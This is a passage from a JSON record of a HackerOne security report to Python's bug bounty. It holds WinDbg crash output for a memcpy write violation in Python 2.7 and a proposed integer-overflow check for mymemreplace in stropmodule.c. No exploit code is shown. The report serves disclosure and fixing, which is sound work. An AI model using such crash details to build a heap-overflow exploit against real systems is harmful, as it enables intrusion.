python27!run_mod+0x2a\n0027fe64 1e1187b0 702c7408 00342ebb 00000101 python27!PyRun_FileExFlags+0x75\n0027fea4 1e119129 702c7408 00342ebb 00000001 python27!PyRun_SimpleFileExFlags+0x190\n0027fec0 1e038cb5 702c7408 00342ebb 00000001 python27!PyRun_AnyFileExFlags+0x59\n0027ff3c 1d00116d 00000002 00342e98 00341950 python27!Py_Main+0x965\n0027ff80 74b97c04 7ffde000 74b97be0 b4e726fd python!__tmainCRTStartup+0x10f\n0027ff94 7701ad1f 7ffde000 b723218a 00000000 KERNEL32!BaseThreadInitThunk+0x24\n0027ffdc 7701acea ffffffff 77000212 00000000 ntdll!__RtlUserThreadStart+0x2f\n0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b\n\n\nSTACK_COMMAND:  .cxr 0x0 ; kb\n\nFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\n\nFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\n\nFAULTING_SOURCE_LINE_NUMBER:  188\n\nFAULTING_SOURCE_CODE:  \nNo source found for 'f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm'\n\n\nSYMBOL_STACK_INDEX:  0\n\nSYMBOL_NAME:  msvcr90!memcpy+5a\n\nFOLLOWUP_NAME:  MachineOwner\n\nMODULE_NAME: MSVCR90\n\nIMAGE_NAME:  MSVCR90.dll\n\nDEBUG_FLR_IMAGE_TIMESTAMP:  51ea24a5\n\nFAILURE_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE_c0000005_MSVCR90.dll!memcpy\n\nBUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE_msvcr90!memcpy+5a\n\nANALYSIS_SOURCE:  UM\n\nFAILURE_ID_HASH_STRING:  um:string_dereference_fill_pattern_nxcode_c0000005_msvcr90.dll!memcpy\n\nFAILURE_ID_HASH:  {031149d8-0626-9042-d8b7-a1766b1c5514}\n\nFollowup: MachineOwner\n---------\n\nTo fix the issue, mymemreplace should validate that the computed value new_len has not overflowed. To do this, (new_len - len) / nfound should be compared to sub_len - pat_len. If that are not equal, an overflow has occurred. Proposed patches for stropmodule.c and test_strop.py are attached.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.python.org/news/security", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Python (IBB)"
        }, 
        "handle": "ibb-python", 
        "url": "https://hackerone.com/ibb-python", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/027/22df52945ba6933f27a1dbc92380fe19a4a1a93d_small.png?1383737131", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/027/79e9602e5e25d02b7c34cdbc40438408f47e7cd7_medium.png?1383737131"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 27, 
        "default_currency": "usd"
    }, 
    "is_published": false
}